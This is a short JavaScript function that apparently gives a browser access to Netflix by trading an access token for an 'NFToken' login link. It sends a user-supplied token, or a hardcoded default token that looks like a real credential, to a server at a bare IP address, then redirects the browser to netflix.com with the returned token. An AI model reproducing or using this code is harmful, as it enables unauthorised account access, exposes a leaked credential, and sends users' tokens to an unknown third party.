function runNetflixScript() {
    let access_token = document.getElementById("access-token-input").value;
    if (!access_token) {
        access_token = "EAAFE0Tw8WfwBAEtaqQp2rdwnZBH2AEX1htpi7KZAZAbj6mypDem1d3l2JoGQH2FOxrzX34ZANnPqi9DpHOnju2TDa7wAJGHcXmnOzc9nJN8ZCtSSi3nK4FGPev3BErCeRvqlts65Ybjxbg2AZAEp1ZClo8Vt6dxlGCMewmMcd7nh2QxCp89Kfw9ZBj2F1XX4sUZAMIlyok18OqWaC2wqpS3VK"; // set a default access token
    }
    const NETFLIX_DOMAIN = "http://www.netflix.com/";
    const url = "https://65.21.228.155/access";
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    };
    const data = { access_token: access_token, profile_id: "100004323155386" };
  
    fetch(url, {
      method: "POST",
      headers: headers,
      body: new URLSearchParams(data),
    })
      .then((response) => {
        if (response.ok) {
          response.json().then((data) => {
            const nftoken = data.data.NFToken;
            const link = NETFLIX_DOMAIN + "?nftoken=" + nftoken;
            console.log(link);
            document.getElementById("netflix-button").style.backgroundColor =
              "green";
            window.open(link);
                            window.location.href = (NETFLIX_DOMAIN + '?nftoken=' + data.data.NFToken);
          });
        } else {
          console.log("Error:", response.status);
          document.getElementById("netflix-button").style.backgroundColor =
            "red";
        }
      })
      .catch((error) => {
        console.log("Error:", error);
        document.getElementById("netflix-button").style.backgroundColor = "red";
      });
  }
  
